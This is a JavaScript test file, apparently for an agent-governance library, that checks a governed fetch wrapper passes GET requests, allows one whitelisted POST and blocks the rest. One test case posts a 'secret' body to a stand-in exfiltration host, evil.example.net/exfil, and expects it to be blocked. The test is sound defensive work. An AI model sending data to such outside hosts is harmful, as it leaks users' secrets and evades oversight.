// Governed fetch: GET passes through; mutations are governed and bound to the body.
import { governFetch } from "@senscheck/generic-tools";
import { GovernanceBlockedError } from "@senscheck/governance-core";
import { agent, assert, build, line } from "../_shared.mjs";

const sent = [];
const fakeFetch = async (url, init = {}) => {
  sent.push(`${init.method ?? "GET"} ${url}`);
  return { status: 200 };
};
const { governance } = build({
  version: 1,
  default: "FAIL_CLOSED",
  rules: [
    { id: "allow-post-tickets", when: { verb: "HTTP_MUTATE", resource: "http:https://api.example.com/tickets" }, decision: "ALLOW" },
  ],
});
const gfetch = governFetch(fakeFetch, { governance, principal: agent });

await gfetch("https://api.example.com/tickets?open=1");
line("GET", "passes through");
await gfetch("https://api.example.com/tickets", { method: "POST", body: JSON.stringify({ title: "hi" }) });
line("POST /tickets", "ALLOW");
for (const [label, run] of [
  ["DELETE /tickets/1", () => gfetch("https://api.example.com/tickets/1", { method: "DELETE" })],
  ["POST to unknown host", () => gfetch("https://evil.example.net/exfil", { method: "POST", body: "secret" })],
]) {
  try {
    await run();
    assert(false, `${label} must be blocked`);
  } catch (err) {
    assert(err instanceof GovernanceBlockedError, "expected a governance block");
    line(label, `${err.decision} [${err.reasonCodes.join(",")}]`);
  }
}
assert(sent.length === 2, `only the GET and the allowed POST may go out (got ${sent.length})`);
